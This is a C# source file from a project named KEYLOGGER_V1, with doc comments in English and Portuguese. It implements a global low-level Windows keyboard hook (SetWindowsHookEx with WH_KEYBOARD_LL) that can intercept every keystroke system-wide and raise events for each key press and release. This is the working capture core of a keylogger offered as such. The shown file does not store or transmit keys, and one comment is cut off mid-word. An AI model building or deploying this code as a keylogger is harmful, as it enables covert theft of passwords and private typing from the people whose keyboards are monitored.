
using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;


namespace KEYLOGGER_V1
{
    class globalKeyboardHook
    {
        #region Constant, Structure and Delegate Definitions
        /// <summary>
        /// defines the callback type for the hook
        /// 
        /// tradução: Define o tipo de retorno de chamada para o gancho
        /// </summary>
        public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);

        public struct keyboardHookStruct
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        public bool _hookAll = false;
        public bool HookAllKeys
        {
            get
            {
                return _hookAll;
            }
            set
            {
                _hookAll = value;
            }
        }
        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x100;
        const int WM_KEYUP = 0x101;
        const int WM_SYSKEYDOWN = 0x104;
        const int WM_SYSKEYUP = 0x105;
        #endregion

        #region Instance Variables

        /// <summary>
        /// he collections of keys to watch for:
        /// 
        /// tradução: As coleções de chaves para assistir
        /// </summary>
        public List<Keys> HookedKeys = new List<Keys>();

        /// <summary>
        /// Handle to the hook, need this to unhook and call the next hook
        /// 
        /// tradução: Identificador para o gancho, precisa disto para desenganchar e chame a próxima gancho
        /// </summary>
        IntPtr hhook = IntPtr.Zero;
        keyboardHookProc khp;
        #endregion

        #region Events

        /// <summary>
        ///  Occurs when one of the hooked keys is pressed
        /// 
        /// tradução: Ocorre quando uma das chaves em forma de gancho é pressionada
        /// </summary>
        public event KeyEventHandler KeyDown;
        
        /// <summary>
        /// Occurs when one of the hooked keys is released
        /// 
        /// tradução: Ocorre quando uma das chaves em forma de gancho é libertado
        /// </summary>
        public event KeyEventHandler KeyUp;
        #endregion

        #region Constructors and Destructors
       
        /// <summary>
        /// Initializes a new instance of the <see cref="globalKeyboardHook"/> class and installs the keyboard hook.
        /// </summary>
        public globalKeyboardHook()
        {
            khp = new keyboardHookProc(hookProc);
            hook();
        }
        /// <summary>
        /// Releases unmanaged resources and performs other cleanup operations before thewss
        ~globalKeyboardHook()
        {
            unhook();
        }
        #endregion

        #region Public Methods
        /// <summary>
        /// Installs the global hook
        /// 
        /// tradução: Instala o gancho global
        /// </summary>
        public void hook()
        {
            IntPtr hInstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, khp, hInstance, 0);
        }

        /// <summary>
        /// Uninstalls the global hook
        /// 
        /// tradução: Desinstala o gancho mundial
        /// </summary>
        public void unhook()
        {
            UnhookWindowsHookEx(hhook);
        }

        /// <summary>
        /// The callback for the keyboard hook
        /// 
        /// tradução: O retorno de chamada para o gancho do teclado
        /// </summary>
        /// 
        /// 
        /// <param name="code">The hook code, if it isn't >= 0, the function shouldn't do anyting
        /// 
        /// tradução: O código de gancho, se não for > = 0, a função não deve fazer nada.
        /// </param>
        /// 
        /// <param name="wParam">The event type
        /// 
        /// tradução: O tipo do Evento
        /// </param>
        /// 
        /// <param name="lParam">The keyhook event information
        /// 
        /// tradução: As informações do evento KeyHook
        /// </param>
        /// <returns></returns>
        

        public int hookProc(int code, int wParam, ref keyboardHookStruct lParam)
        {
           if (code >= 0)
            {
                Keys key = (Keys)lParam.vkCode;

                if (_hookAll ? true : HookedKeys.Contains(key))
                {
                    KeyEventArgs kea = new KeyEventArgs(key);
                    if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && (KeyDown != null))
                    {
                        KeyDown(this, kea);
                    }
                    else if ((wParam == WM_KEYUP || wParam == WM_SYSKEYUP) && (KeyUp != null))
                    {
                        KeyUp(this, kea);
                    }
                    if (kea.Handled)
                        return 1;
                }
            }
            return CallNextHookEx(hhook, code, wParam, ref lParam);
        }

        #endregion

        #region DLL imports
        /// <summary>
        /// Sets the windows hook, do the desired event, one of hInstance or threadId must be non-null
        /// 
        /// tradução: Define o gancho janelas , faça o evento desejado , um dos hInstance ou ThreadID deve ser não-nulo
        /// </summary>
        /// <param name="idHook">
        /// The id of the event you want to hook
        ///
        /// traudção: O ID do evento que pretende ligar
        /// </param>
        /// 
        /// <param name="callback">The callback.
        /// 
        /// tradução: O retorno de chamada .
        /// </param>
        /// <param name="hInstance">The handle you want to attach the event to, can be null
        /// 
        /// tradução: A alça que deseja anexar o evento para , pode ser nulo
        /// </param>
        /// <param name="threadId">The thread you want to attach the event to, can be null
        /// 
        /// tradução: O fio que você deseja anexar o evento para , pode ser nulo
        /// </param>
        /// <returns>a handle to the desired hook</returns>
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);

        /// <summary>
        /// Unhooks the windows hook.
        /// 
        /// tradução: Desvincula o gancho janelas
        /// </summary>
        /// <param name="hInstance">The hook handle that was returned from SetWindowsHookEx
        /// 
        /// tradução: A pega gancho que foi retornado do SetWindowsHookEx
        /// </param>
        /// <returns>True if successful, false otherwise
        /// 
        /// tradução: Verdadeiro se bem sucedida, caso contrário false
        /// </returns>
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        /// <summary>
        /// Calls the next hook.
        /// 
        /// tradução: Chama o próximo gancho.
        /// </summary>
        /// <param name="idHook">The hook id
        /// 
        /// tradução: O ID de gancho
        /// </param>
        /// <param name="nCode">The hook code
        /// 
        /// tradução: O código de gancho
        /// </param>
        /// <param name="wParam">The wparam.
        /// 
        /// tradução: O wParam
        /// </param>
        /// <param name="lParam">The lparam.
        /// 
        /// tradução: O lParam
        /// </param>
        /// <returns></returns>
        [DllImport("user32.dll")]
        static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);

        /// <summary>
        /// Loads the library.
        /// 
        /// tradução: Carrega a biblioteca.
        /// </summary>
        /// <param name="lpFileName">Name of the library
        /// 
        /// tradução: Nome da biblioteca
        /// </param>
        /// <returns>A handle to the library
        /// 
        /// tradução: A handle to the library
        /// </returns>
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        #endregion
    }
}

